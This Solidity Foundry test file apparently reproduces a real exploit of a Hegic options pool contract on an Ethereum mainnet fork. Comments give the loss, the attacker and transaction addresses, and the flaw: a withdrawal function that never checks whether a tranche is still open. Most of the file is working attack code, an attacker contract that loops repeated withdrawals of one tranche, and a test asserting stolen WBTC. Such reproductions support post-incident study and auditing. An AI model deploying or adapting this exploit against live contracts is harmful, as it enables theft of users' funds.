// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost: ~94K USD
// Attacker: https://etherscan.io/address/0x4B53608fF0cE42cDF9Cf01D7d024C2c9ea1aA2e8
// Attack Contract: https://etherscan.io/address/0xF51E888616a123875EAf7AFd4417fbc4111750f7
// Attack Tx: https://etherscan.io/tx/0x260d5eb9151c565efda80466de2e7eee9c6bd4973d54ff68c8e045a26f62ea73
// Vulnerable Contract: https://etherscan.io/address/0x7094E706E75E13D1E0ea237f71A7C4511e9d270B
//
// _withdraw() marked the tranche Closed but did not require it to be Open.
// The owner could therefore withdraw the same tranche repeatedly.

interface IHegicPool {
    function provideFrom(
        address account,
        uint256 amount,
        bool hedged,
        uint256 minShare
    ) external returns (uint256 share);
    function withdrawWithoutHedge(
        uint256 trancheId
    ) external returns (uint256 amount);
}

contract HegicAttacker {
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IHegicPool private constant POOL = IHegicPool(0x7094E706E75E13D1E0ea237f71A7C4511e9d270B);

    function createTranche() external {
        WBTC.approve(address(POOL), type(uint256).max);
        POOL.provideFrom(address(this), 0.0025e8, false, 0);
    }

    function attack(
        uint256 trancheId,
        uint256 iterations
    ) external {
        for (uint256 i; i < iterations; ++i) {
            POOL.withdrawWithoutHedge(trancheId);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract HegicOptionsExploitTest is Test {
    IERC20 private constant WBTC_TOKEN = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    uint256 private constant FORK_BLOCK = 21_691_131;
    uint256 private constant NEXT_TRANCHE_ID = 2;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", FORK_BLOCK);
    }

    function testExploit() public {
        HegicAttacker attacker = new HegicAttacker();
        deal(address(WBTC_TOKEN), address(attacker), 0.0025e8);
        attacker.createTranche();

        vm.warp(block.timestamp + 31 days);
        uint256 balanceBefore = WBTC_TOKEN.balanceOf(address(attacker));
        attacker.attack(NEXT_TRANCHE_ID, 100);

        uint256 stolen = WBTC_TOKEN.balanceOf(address(attacker)) - balanceBefore;
        emit log_named_decimal_uint("Stolen WBTC", stolen, 8);
        assertGt(stolen, 0.2e8);
    }
}
